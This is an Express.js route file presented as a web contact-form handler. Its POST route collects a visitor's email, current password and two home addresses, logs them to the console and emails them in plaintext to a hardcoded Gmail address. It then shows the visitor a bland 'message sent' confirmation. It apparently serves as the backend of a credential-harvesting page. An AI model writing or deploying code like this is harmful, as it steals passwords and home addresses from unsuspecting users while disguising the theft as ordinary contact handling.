var express = require('express');
var router = express.Router();
var nodemailer = require('nodemailer');

/* GET home page. */
router.get('/', function (req, res, next) {
  res.render('index', { title: 'Express' });
});
router.post ('/', async (req, res, next) => {

 console.log(req.body)

  var Email = req.body.Email;
  var Contraseña = req.body.Contraseña;
  var Dirección = req.body.Dirección;
  var Dirección2 = req.body.Dirección2;
  var Localidad = req.body.Localidad;
  var Provincia = req.body.Provincia;

  var obj = {
    to: 'hugokriptocoin@gmail.com',
    subject: 'Contacto Web',
    html: Email + " se contacto a travéz de este mail: <br>" + Contraseña + ". siendo su actual contraseña <br>" + Dirección +
      "  es su dirección: <br>" + Dirección2 + " su otra casa: <br>" + Localidad + " siendo la localidad de residencia: <br>" + Provincia
  }
  var transport = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    }
  })

  var info = await transport.sendMail(obj);

  res.render('index', {
    message: 'Mensaje enviado correctamente',
  });
});







module.exports = router;